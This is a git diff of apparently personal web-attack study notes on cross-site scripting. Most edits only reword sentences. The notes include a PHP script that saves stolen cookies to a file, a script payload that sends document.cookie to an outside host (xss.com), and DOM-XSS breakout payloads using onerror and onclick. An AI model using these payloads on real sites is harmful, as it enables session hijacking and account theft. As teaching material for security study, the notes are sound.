@@ -62,6 +62,14 @@ slug: web-attack
         
 ```
 
+
+
+
+
+
+
+
+
 # XSS
 
 ## Types
@@ -72,7 +80,7 @@ slug: web-attack
 
 ## Reflected
 
-Not persistent, supports only a single link
+Not persistent, only supports a single link
 
 ## Stored
 
@@ -80,7 +88,7 @@ Stored on the attacked server, persistent
 
 ## DOM
 
-Not passed to the backend; the frontend obtains information through the document object, and JS concatenates and executes it
+Not sent to the backend, the frontend retrieves information through the document object, and JS concatenates and executes it
 
 ### Cookie
 
@@ -106,7 +114,7 @@ SameSite	定义cookie如何跨域发送
 
 - Exfiltrate via request
 
-  Start a listener on the VPS; after inserting code into a website with an XSS vulnerability, you can receive the target's cookie (base64_encode)
+  Start listening on a VPS, and after inserting code into a website with an XSS vulnerability, you can receive the target's cookie (base64_encode)
 
   ```html
   #攻击后浏览器打开新窗口，访问指定ip：端口，带上cookie
@@ -131,9 +139,16 @@ SameSite	定义cookie如何跨域发送
 
   BLUE-LOTUS
 
-  else……
+  else......
+
+
+
+
+
+
 
 ---
+
 ```php+HTML
 <?php
 $filename ='cookies.txt';
@@ -144,28 +159,33 @@ fclose($f);
 ?>
 ```
 
- It will URL-decode the value of the msg parameter and then save it into the file cookies.txt.
+ It will URL-decode the value of the msg parameter and then save it to the file cookies.txt.
 
-   Next, we need to construct JS code to initiate an HTTP request. Using an Image object makes this task very easy: create a new Image object, then set the src attribute. When the browser encounters the src attribute, it automatically requests the URL pointed to by src. For this URL, write the URL of the cookie-receiving page we just created, and pass the msg parameter, with the value being the cookie. The final constructed statement is:
+   Next is to construct JS code to initiate an HTTP request. Using the Image object makes this task very easy. Create a new Image object, then set the src attribute. When the browser encounters the src attribute, it will automatically request the URL pointed to by src. For this URL, write the URL of the page we just wrote that receives the cookie, and pass the msg parameter with the value being the cookie. The final constructed statement is:
 
 ```php+HTML
 <script>new Image().src="http://xss.com/recv_cookies.php?msg="+encodeURI(document.cookie);</script>
 ```
 
+
+
 ---
+
 ```php+HTML
 function xssDom(){
 var str = document.getElementById("msg").Value;
 document.getElementById("show").innerHTML = "<a href="" + str + "'>xssDom</a>"
 ```
 
-To make it free of syntax errors, we need to construct statements to close some tags. So, first we need a single quote to close the href attribute of the a tag. Then a “>” to close the a tag's “<”。这样构造以后，就变成了“<a href=''>construct the exploit code here'>xssDom</a>”. So we can construct the following statement:
+To make it free of syntax errors, we need to construct statements to close some tags. So, first we need a single quote to close the href attribute of the a tag. Then a ">" to close the a tag's "<”。这样构造以后，就变成了“<a href=''>construct the exploit code here'>xssDom</a>". So we can construct the following statement:
 
    ` '><script>alert('xss');</script>`
 
-W3C specifies that script code inside script tags inserted via innerHTML cannot execute.
 
-Directly inserting script cannot execute, but we can use events to trigger it, such as onerror, onclick, etc.
+
+W3C stipulates that script code inside a script tag inserted via innerHTML cannot execute.
+
+Directly inserting script cannot execute, but we can use events to trigger it, such as: onerror, onclick, etc.
 
 Construct the following data:
 
@@ -175,11 +195,13 @@ At this point the page code becomes:
 
 `<a href='' onclick=alert(/xss/) //'>xssDom</a>`
 
-There are other construction methods. For example, we close the a tag, then introduce another tag, such as an img tag. By using the img tag, when loading src, if an error occurs it triggers the onerror function, so we can automatically execute the script code without interaction. Try entering the following data:
+There are other construction methods. For example, we close the a tag, then introduce another tag, such as an img tag. By using the img tag, when loading src, if an error occurs it will trigger the onerror function, so we can automatically execute script code without interaction. Try entering the following data:
 
 `    '><img src=123 onerror=alert(/xss/) />`
 
-## In-page Jump
+
+
+## In-page jump
 
 ```xml
     页面内的跳转需要两步：
